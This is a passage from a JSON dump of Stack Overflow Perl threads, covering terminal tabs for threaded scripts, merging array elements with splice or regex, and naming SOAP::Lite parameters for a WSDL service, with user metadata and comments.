"https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 0, "creation_date": 1485637289, "post_id": 41913559, "comment_id": 71010892, "body": "@melpomene: <i>&quot;Perl threads are not known to be fast&quot;</i> is different from them being <i>known not to be fast</i>. Especially <i>&quot;spawning a new thread clones the perl interpreter, which makes a copy of all variables/data structures in your code&quot;</i> is hugely misleading because it implies that the whole of perl is copied for every thread. In fact executable memory contents (perl itself) won&#39;t be duplicated, and if you write your program carefully then <i>&quot;all variables/data structures in your code&quot;</i> should be only a few hundred bytes."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1485637695, "post_id": 41913559, "comment_id": 71011006, "body": "@AndrzejA.Filip: <i>&quot;Each worker thread should get/use its own terminal (terminal tab) via STDIN/STDOUT/STDERR&quot;</i>. How does your system currently work? Have you written a working <i>&quot;main thread&quot;</i>?"}, {"owner": {"reputation": 9961, "user_id": 2139766, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/b3qcA.png?s=128&g=1", "display_name": "AnFi", "link": "https://stackoverflow.com/users/2139766/anfi"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1485640516, "post_id": 41913559, "comment_id": 71011839, "body": "@Borodin It is currently single process conducting long series of quite long operations (a few minutes each with quite low CPU and I/O usage).  I want to allow conducting sub-series of the operations in parallel  with <b>MINIMAL</b> redesign of the script.  &quot;Monitoring shared log file&quot; is the second redesign option due to current implementation of &quot;progress monitoring&quot;."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1485643127, "post_id": 41913559, "comment_id": 71012621, "body": "@AndrzejA.Filip: I get that you want to do something in parallel, but I don&#39;t know what the data feed looks like. Are there dozens of data entry clerks typing stuff in? Or are you processing the contents of a database? Or something else?"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 2, "creation_date": 1485643361, "post_id": 41913559, "comment_id": 71012675, "body": "@AndrzejA.Filip: I&#39;m afraid you&#39;ve fallen into the trap of progressing too far along the design path without asking for help. <b>Sobrique</b> would call it an <i>X Y problem</i>. It&#39;s looking like you need to explain the problem and describe the data in a new question, and talk about what you&#39;ve planned so far. You&#39;ll get a much better answer that way."}, {"owner": {"reputation": 9961, "user_id": 2139766, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/b3qcA.png?s=128&g=1", "display_name": "AnFi", "link": "https://stackoverflow.com/users/2139766/anfi"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1485646332, "post_id": 41913559, "comment_id": 71013457, "body": "@Borodin It is trap of a &quot;legacy&quot; script. Progress indicators provided by external programs executed in the script are &quot;fancy&quot; but I would like to see them. STDIN is ignored after short initial phase. I want to check <b>simple</b> alternatives of big rewrite e.g. using <code>Term::Cap</code>.  Sorry but I am unable to provide <b>reasonably short</b> explanation of the script task."}, {"owner": {"reputation": 9961, "user_id": 2139766, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/b3qcA.png?s=128&g=1", "display_name": "AnFi", "link": "https://stackoverflow.com/users/2139766/anfi"}, "reply_to_user": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 1, "creation_date": 1485686434, "post_id": 41913559, "comment_id": 71020879, "body": "@melpomene Could you turn your <code>urxvt -pty-fd FD</code> hint into the answer? It is not exactly what I have asked for but it is the closest hit so far."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1485803405, "post_id": 41913559, "comment_id": 71067402, "body": "I think you need to rewrite your application as a web application. It shouldn&#39;t be too hard."}], "owner": {"reputation": 9961, "user_id": 2139766, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/b3qcA.png?s=128&g=1", "display_name": "AnFi", "link": "https://stackoverflow.com/users/2139766/anfi"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 94, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1485629944, "creation_date": 1485629625, "last_edit_date": 1485629944, "question_id": 41913559, "link": "https://stackoverflow.com/questions/41913559/perl-control-over-multi-tab-terminal-window", "title": "perl control over multi-tab terminal window", "body": "<p>Which linux multi-tab terminal app can be controlled by perl script?</p>\n\n<p>I would like to start multi-thread perl script with each thread using its own separate terminal (terminal tab).</p>\n\n<p>It may be the easiest way to speed up existing app without huge rewriting.</p>\n"}, {"tags": ["perl"], "answers": [{"comments": [{"owner": {"reputation": 83048, "user_id": 2255089, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/ZNAsT.jpg?s=128&g=1", "display_name": "Casimir et Hippolyte", "link": "https://stackoverflow.com/users/2255089/casimir-et-hippolyte"}, "edited": false, "score": 0, "creation_date": 1485609874, "post_id": 41909886, "comment_id": 71001719, "body": "If each element is just one character, you don&#39;t need a delimiter at all."}, {"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "reply_to_user": {"reputation": 83048, "user_id": 2255089, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/ZNAsT.jpg?s=128&g=1", "display_name": "Casimir et Hippolyte", "link": "https://stackoverflow.com/users/2255089/casimir-et-hippolyte"}, "edited": false, "score": 0, "creation_date": 1485610059, "post_id": 41909886, "comment_id": 71001783, "body": "@CasimiretHippolyte: Try it with <code>qw( a s v b v s c )</code>."}, {"owner": {"reputation": 83048, "user_id": 2255089, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/ZNAsT.jpg?s=128&g=1", "display_name": "Casimir et Hippolyte", "link": "https://stackoverflow.com/users/2255089/casimir-et-hippolyte"}, "edited": false, "score": 0, "creation_date": 1485610709, "post_id": 41909886, "comment_id": 71001996, "body": "You are right, it splits between v and s. I missed that."}], "tags": [], "owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "is_accepted": false, "score": 3, "last_activity_date": 1485607749, "last_edit_date": 1485607749, "creation_date": 1485607154, "answer_id": 41909886, "question_id": 41909520, "link": "https://stackoverflow.com/questions/41909520/merge-and-replace-two-array-elements/41909886#41909886", "title": "Merge and replace two array elements", "body": "<p>You can use <code>splice</code> to replace two elements in the middle of an array:</p>\n\n<pre><code>my $i = 0;\nwhile ($i &lt; $#array) {\n    splice @array, $i, 2, 'vs'\n        if 's' eq $array[$i] &amp;&amp; 'v' eq $array[ $i + 1 ];\n    $i++;\n}\n</code></pre>\n\n<p>If you know the array can't contain a character (for example <code>!</code>) and that each element is just one character, you can <code>join</code> the array into a string and use the substitution to do the work:</p>\n\n<pre><code>my $str = join '!', @array;\n$str =~ s/s!v/vs/g;\n@array = split /!/, $str;\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1485621355, "post_id": 41910478, "comment_id": 71005530, "body": "@choroba: I&#39;ve realised that my <i>other way completely</i> is a single-statement version of your second option. I apologise. I think it&#39;s best to leave it here now though."}], "tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": false, "score": 1, "last_activity_date": 1485611016, "creation_date": 1485611016, "answer_id": 41910478, "question_id": 41909520, "link": "https://stackoverflow.com/questions/41909520/merge-and-replace-two-array-elements/41910478#41910478", "title": "Merge and replace two array elements", "body": "<p>You could do this another way completely using a string substitution</p>\n\n<pre><code>@array = split ' ', \"@array\" =~ s/s v/vs/gr;\n</code></pre>\n\n<h3>output</h3>\n\n<pre><code>a vs b vs s f v\n</code></pre>\n"}], "owner": {"reputation": 1, "user_id": 7097061, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/28b7186af15df8ef275fb33fde3dbacb?s=128&d=identicon&r=PG&f=1", "display_name": "Pille", "link": "https://stackoverflow.com/users/7097061/pille"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 78, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1486203878, "creation_date": 1485604613, "last_edit_date": 1485605306, "question_id": 41909520, "link": "https://stackoverflow.com/questions/41909520/merge-and-replace-two-array-elements", "title": "Merge and replace two array elements", "body": "<p>How could I make it more simple?</p>\n\n<pre><code>@array= ('a','s','v','b','s','v','s','f','v');\n$i= 0;\n$maxarray= @array;\nwhile ($i&lt;$maxarray-1) {\n    if (($array[$i] eq 's') &amp;&amp; ($array[$i+1] eq 'v')) {\n        splice (@array, $i, 1);\n        $array[$i]= 'vs';\n    } else { # if\n        $i++;\n    } # if\n    $maxarray= @array;\n} # while\n</code></pre>\n\n<p>output: (replace ('s', 'v') to ('vs')</p>\n"}, {"tags": ["perl", "wsdl", "soaplite"], "comments": [{"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1485622075, "post_id": 41908822, "comment_id": 71005769, "body": "There&#39;s a lot of information missing here. What did you do with the hash <code>%params</code>? What problem did you see using a hash? What did you do with the array <code>@params</code>? Where in the sources did your <i>String value expected</i> error arise (file and line number)?"}, {"owner": {"reputation": 8001, "user_id": 307297, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/e28FD.png?s=128&g=1", "display_name": "chris01", "link": "https://stackoverflow.com/users/307297/chris01"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1485633182, "post_id": 41908822, "comment_id": 71009579, "body": "I agree it is not very smart to use a wsdl-service and name the paramters. But how do I know what parameters the created functions of the service have and whats the order???"}], "answers": [{"comments": [{"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1485622918, "post_id": 41911747, "comment_id": 71006061, "body": "<i>&quot;All the requests can be done without <code>SOAP::Lite</code>&quot;</i> That may be so, but isn&#39;t very much help. It&#39;s an <a href=\"https://simonkidd.wordpress.com/2010/08/12/if-i-were-you-i-wouldnt-start-from-here/\" rel=\"nofollow noreferrer\"><i>If I were you, I wouldn\u2019t start from here</i></a> answer and it involves hand-coding a significant amount of XML, which is what the <code>SOAP</code> modules are designed to avoid."}, {"owner": {"reputation": 2064, "user_id": 3606329, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/027b912750dbb94c9c1ff89c9eb20f46?s=128&d=identicon&r=PG&f=1", "display_name": "user3606329", "link": "https://stackoverflow.com/users/3606329/user3606329"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1485624619, "post_id": 41911747, "comment_id": 71006674, "body": "@ Borodin: I&#39;m afraid but you are wrong. Building a huge nested call with SOAP::Lite takes much longer than parsing the WSDL one time with a SOAP client (for example Boomerang) and writing it in heredoc style. Furthermore, it seems you have not understood that my answer is based on SOAP::Lite and the refered link is more or less only an idea."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1485627444, "post_id": 41911747, "comment_id": 71007646, "body": "This isn&#39;t a <i>huge nested call</i>. And are you talking about coding time, execution time, network time? I think coding time is hugely reduced by using <code>SOAP::SQLite</code> (unless you count references to Stack Overflow). I also understand that your final sentence was notional, but do you think I must not comment on it, or that it can&#39;t be improved?"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1485628011, "post_id": 41911747, "comment_id": 71007850, "body": "I would also point out that the voting on Stack Overflow is anonymous by design. Even if you <i>think</i> you know who placed the vote, the intention is that you should behave as if you have no idea. Tit-for-tat voting is unconstructive at the best of times, and is always a contravention of the rules."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1485629514, "post_id": 41911747, "comment_id": 71008385, "body": "@simbabque: It all looks intact to me. Please explain! And I don&#39;t like to think of it as a rant, but perhaps it&#39;s for others to judge."}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1485629869, "post_id": 41911747, "comment_id": 71008525, "body": "<i>I downvote posts that I think are useful overall, regardless of any mistakes</i>. The rant was meant with a wink. :-)"}, {"owner": {"reputation": 2064, "user_id": 3606329, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/027b912750dbb94c9c1ff89c9eb20f46?s=128&d=identicon&r=PG&f=1", "display_name": "user3606329", "link": "https://stackoverflow.com/users/3606329/user3606329"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1485637139, "post_id": 41911747, "comment_id": 71010849, "body": "@Borodin: There is no need to rewrite an official example from the documentation. I also don&#39;t care much about votes here as I barely vote myself. Your comments are all based on guesses and appear to be too aggressive for a normal discussion."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1485637957, "post_id": 41911747, "comment_id": 71011061, "body": "@simbabque: Gah! And I can&#39;t even contort that sentence into something that I meant to say! Thank you for your help."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1485638489, "post_id": 41911747, "comment_id": 71011207, "body": "@user3606329: <i>&quot;There is no need to rewrite an official example from the documentation&quot;</i> I agree completely. So don&#39;t do it. If you want to alert the OP that his question is already answered in the documentation then you should provide a hyperlink. If you have no other insight into the situation then you should post that link in a comment, or not at all."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 1, "creation_date": 1485638755, "post_id": 41911747, "comment_id": 71011278, "body": "@user3606329: <i>&quot;Your comments are all based on guesses&quot;</i>. No. They are based on my understanding of the Perl language and of Stack Overflow. <i>&quot;And appear to be too aggressive for a normal discussion&quot;</i> I apologise if you feel that way. My intention is always to be inclusive and liberal."}], "tags": [], "owner": {"reputation": 2064, "user_id": 3606329, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/027b912750dbb94c9c1ff89c9eb20f46?s=128&d=identicon&r=PG&f=1", "display_name": "user3606329", "link": "https://stackoverflow.com/users/3606329/user3606329"}, "is_accepted": false, "score": -1, "last_activity_date": 1485619400, "last_edit_date": 1495539931, "creation_date": 1485618837, "answer_id": 41911747, "question_id": 41908822, "link": "https://stackoverflow.com/questions/41908822/soaplite-parameter-addressing/41911747#41911747", "title": "SOAP::Lite, parameter-addressing", "body": "<p>I don't think you can name the parameters if you create the stubs from the service descriptions by calling service().</p>\n\n<p>If you want to assign values to the parameters, there is an example available on <a href=\"http://search.cpan.org/~phred/SOAP-Lite-1.20/lib/SOAP/Lite.pm#RPC/LITERAL\" rel=\"nofollow noreferrer\">CPAN</a>.</p>\n\n<p><strong>Function sayHello</strong></p>\n\n<pre><code> &lt;sayHello xmlns=\"urn:HelloWorld\"&gt;\n   &lt;name xsi:type=\"xsd:string\"&gt;Kutter&lt;/name&gt;\n   &lt;givenName xsi:type=\"xsd:string\"&gt;Martin&lt;/givenName&gt;\n &lt;/sayHello&gt;\n</code></pre>\n\n<p><strong>SOAP request</strong></p>\n\n<pre><code> use SOAP::Lite;\n my $soap = SOAP::Lite-&gt;new( proxy =&gt; 'http://localhost:81/soap-wsdl-test/helloworld.pl');\n $soap-&gt;default_ns('urn:HelloWorld');\n my $som = $soap-&gt;call('sayHello',\n    SOAP::Data-&gt;name('name')-&gt;value('Kutter'),\n    SOAP::Data-&gt;name('givenName')-&gt;value('Martin')\n );\n die $som-&gt;faultstring if ($som-&gt;fault);\n print $som-&gt;result, \"\\n\";\n</code></pre>\n\n<p>You have to replace the value of <code>proxy</code> to <code>http://mywsdl</code>, <code>name</code> and <code>givenName</code> to <code>p1</code> and <code>p2</code>, <code>sayHello</code> to <code>foo</code> and <code>urn:HelloWorld</code> to your WSDLs namespace.</p>\n\n<p>I also recommend to check <a href=\"https://stackoverflow.com/questions/41801525/perl-soap-web-service-call-with-xml/41817637#41817637\">this</a>. All the requests can be done without SOAP::Lite.</p>\n"}, {"comments": [{"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1485629326, "post_id": 41912607, "comment_id": 71008328, "body": "The part I don&#39;t understand here is how this gives more flexibility. It&#39;s a lot more code,  and I think the order is still relevant. But that&#39;s the OP&#39;s claim, not yours."}], "tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": false, "score": 1, "last_activity_date": 1485624048, "creation_date": 1485624048, "answer_id": 41912607, "question_id": 41908822, "link": "https://stackoverflow.com/questions/41908822/soaplite-parameter-addressing/41912607#41912607", "title": "SOAP::Lite, parameter-addressing", "body": "<p>If you want to specify the names of the parameters then you should avoid creating a <em>service</em>, which is mostly intended to avoid such housekeeping</p>\n\n<p>If you simply <code>call</code> the method and supply its parameters then it should do what you want</p>\n\n<pre><code>$client-&gt;call(foo =&gt;\n   SOAP::Data-&gt;name( p1 =&gt; 'max' ),\n   SOAP::Data-&gt;name( p2 =&gt; 'frank' )\n);\n</code></pre>\n\n<p>Note that</p>\n\n<pre><code>SOAP::Data-&gt;name( p1 =&gt; 'max' )\n</code></pre>\n\n<p>is an undocumented contraction of </p>\n\n<pre><code>SOAP::Data-&gt;name('p1')-&gt;value('max')\n</code></pre>\n\n<p>or</p>\n\n<pre><code>SOAP::Data-&gt;new( name =&gt; 'p1', value =&gt; 'max' )\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 8001, "user_id": 307297, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/e28FD.png?s=128&g=1", "display_name": "chris01", "link": "https://stackoverflow.com/users/307297/chris01"}, "edited": false, "score": 0, "creation_date": 1485634940, "post_id": 41914399, "comment_id": 71010186, "body": "SOAP::WSDL is integrated in SOAP::Lite and should not be used any more. wsdl2perl is not required for SOPA::Lite wsdl-service. So whats the miracle to know what parameters the service-function do have and in what order???"}, {"owner": {"reputation": 7502, "user_id": 6368697, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/yq4cG.jpg?s=128&g=1", "display_name": "Patrick Mevzek", "link": "https://stackoverflow.com/users/6368697/patrick-mevzek"}, "reply_to_user": {"reputation": 8001, "user_id": 307297, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/e28FD.png?s=128&g=1", "display_name": "chris01", "link": "https://stackoverflow.com/users/307297/chris01"}, "edited": false, "score": 1, "creation_date": 1485715320, "post_id": 41914399, "comment_id": 71029547, "body": "You have <code>stubmaker.pl</code> in <code>SOAP::Lite</code>. Maybe browsing the code it produces can give hints on how to access parameters. It seems each service class has a <code>parameters</code> method giving back a list of <code>SOAP::Data</code> objects with name and type."}, {"owner": {"reputation": 7502, "user_id": 6368697, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/yq4cG.jpg?s=128&g=1", "display_name": "Patrick Mevzek", "link": "https://stackoverflow.com/users/6368697/patrick-mevzek"}, "reply_to_user": {"reputation": 8001, "user_id": 307297, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/e28FD.png?s=128&g=1", "display_name": "chris01", "link": "https://stackoverflow.com/users/307297/chris01"}, "edited": false, "score": 0, "creation_date": 1485715477, "post_id": 41914399, "comment_id": 71029609, "body": "Maybe: <code>SOAP::Schema-&gt;new(parse =&gt; $file)-&gt;services()-&gt;{$service}-&gt;{&#39;parameters&#39;}</code>"}, {"owner": {"reputation": 7502, "user_id": 6368697, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/yq4cG.jpg?s=128&g=1", "display_name": "Patrick Mevzek", "link": "https://stackoverflow.com/users/6368697/patrick-mevzek"}, "reply_to_user": {"reputation": 8001, "user_id": 307297, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/e28FD.png?s=128&g=1", "display_name": "chris01", "link": "https://stackoverflow.com/users/307297/chris01"}, "edited": false, "score": 0, "creation_date": 1485813843, "post_id": 41914399, "comment_id": 71072785, "body": "See also <a href=\"http://stackoverflow.com/a/3144948/6368697\">this previous answer</a>"}], "tags": [], "owner": {"reputation": 7502, "user_id": 6368697, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/yq4cG.jpg?s=128&g=1", "display_name": "Patrick Mevzek", "link": "https://stackoverflow.com/users/6368697/patrick-mevzek"}, "is_accepted": false, "score": 0, "last_activity_date": 1485634644, "creation_date": 1485634644, "answer_id": 41914399, "question_id": 41908822, "link": "https://stackoverflow.com/questions/41908822/soaplite-parameter-addressing/41914399#41914399", "title": "SOAP::Lite, parameter-addressing", "body": "<p>If you would like to use a WSDL file (welcome to hell), you need to use <a href=\"http://www.metacpan.org/pod/SOAP::WSDL\" rel=\"nofollow noreferrer\">SOAP::WSDL</a> instead of SOAP::Lite. Then you will have an utility called wsdl2perl.pl. If you run it on your wsdl file it will create a lot of perl code, including some classes for each service defined in the wsdl file.</p>\n\n<p>Then in your code you instantiate a new instance of the specific endpoint you want to use, and then you call on this object methods named after the services offered on this endpoint (you do not use the <code>call</code> method anymore), passing a hash reference with all parameters.</p>\n\n<p>You will still need to know what parameters are expected because there is not a lot of introspection available (you can have a workaround that because if you pass an unknown parameter name to the classes they will die and in the error message you will have the list of available parameters, so you can catch that and parse the error string. Ugly, but I did not find another way to do it).</p>\n"}], "owner": {"reputation": 8001, "user_id": 307297, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/e28FD.png?s=128&g=1", "display_name": "chris01", "link": "https://stackoverflow.com/users/307297/chris01"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 531, "favorite_count": 0, "answer_count": 3, "score": 0, "last_activity_date": 1485634644, "creation_date": 1485600158, "last_edit_date": 1485633714, "question_id": 41908822, "link": "https://stackoverflow.com/questions/41908822/soaplite-parameter-addressing", "title": "SOAP::Lite, parameter-addressing", "body": "<p>I am using <a href=\"https://metacpan.org/pod/SOAP::Lite\" rel=\"nofollow noreferrer\"><code>SOAP::Lite</code></a> to use a WSDL-defined webservice.</p>\n\n<p>My request (that is working fine) is like that.</p>\n\n<pre><code>&lt;soapenv:Envelope xmlns:soapenv=\"http://myabc\"&gt;\n &lt;soapenv:Header/&gt;\n &lt;soapenv:Body&gt;\n  &lt;foo&gt;\n     &lt;p1&gt;max&lt;/p1&gt;\n     &lt;p2&gt;frank&lt;/p2&gt;\n  &lt;/foo&gt;\n.... \n</code></pre>\n\n<p>My perl code.</p>\n\n<pre><code>my $service = SOAP::Lite-&gt;service (\"http://mywsdl\");\nmy $ret = $service-&gt;foo (\"max\", \"frank\");\n</code></pre>\n\n<p>That is working too.</p>\n\n<p>But I like to name/address my parameters p1 and p2 to have more flexibility.</p>\n\n<p>I tried it with a hash</p>\n\n<pre><code>my %params = (p1 =&gt; \"max\", p2 =&gt; \"frank\");\n</code></pre>\n\n<p>and also with <a href=\"https://metacpan.org/pod/SOAP::Data\" rel=\"nofollow noreferrer\"><code>SOAP::Data</code></a>.</p>\n\n<pre><code>my @params = (\n SOAP::Data-&gt;name (p1 =&gt; \"max\"), \n SOAP::Data-&gt;name (p2 =&gt; \"frank\"));\n</code></pre>\n\n<p>But it is not working that way.</p>\n\n<blockquote>\n  <p>String value expected instead of <code>SOAP::Data</code> reference</p>\n</blockquote>\n\n<p>Any ideas how to name my parameters?</p>\n\n<p><strong>EDIT</strong></p>\n\n<p>I like to use wsdl service. So how do I know how the service functions expect their parameters?? \nThats the core of my question. I thought about the naming of parameters for a workaround. </p>\n"}, {"tags": ["perl", "try-catch", "eval", "gtk3", "perl-critic"], "comments": [{"owner": {"reputation": 5181, "user_id": 793172, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/2ec2c4d63fb493164e87d386646c2285?s=128&d=identicon&r=PG", "display_name": "Axel Beckert", "link": "https://stackoverflow.com/users/793172/axel-beckert"}, "reply_to_user": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": 